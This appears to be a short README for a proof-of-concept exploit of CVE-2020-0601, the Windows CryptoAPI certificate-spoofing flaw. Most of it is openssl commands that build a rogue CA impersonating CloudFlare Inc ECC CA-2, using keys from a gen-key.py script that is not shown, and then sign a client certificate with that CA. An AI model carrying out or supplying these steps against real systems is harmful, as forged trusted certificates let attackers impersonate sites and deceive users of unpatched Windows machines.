# CryptoAPI

CVE-2020-0601: Windows CryptoAPI Spoofing Vulnerability exploitation

# CA certificate

We used the [CloudFlare Inc ECC CA-2](https://ssl-tools.net/subjects/2b0413693df1d33d7e89cba055cf204f9c158c9d)

An example of usage of this certificate is :
```bash
openssl s_client -connect tonerrefillkits.com:443 -showcerts
```

To generate a private key which match the public key certificate we used the script **gen-key.py**. Then to generate the rogue CA:

```bash
$ openssl req -key p256-key-rogue.pem -new -out ca-rogue.pem -x509
```

Using these parameters: "C = US, ST = CA, L = San Francisco, O = "CloudFlare, Inc.", CN = CloudFlare Inc ECC CA-2"

The we generate the following private key and certificate:
```bash
openssl ecparam -name prime256v1 -genkey -noout -out prime256v1-privkey.pem

openssl req -key prime256v1-privkey.pem -new -out prime256v1.csr

openssl x509 -req -in prime256v1.csr -CA ca-rogue.pem -CAkey p256-key-rogue.pem -CAcreateserial -out client-cert.pem -days 500 -sha256
```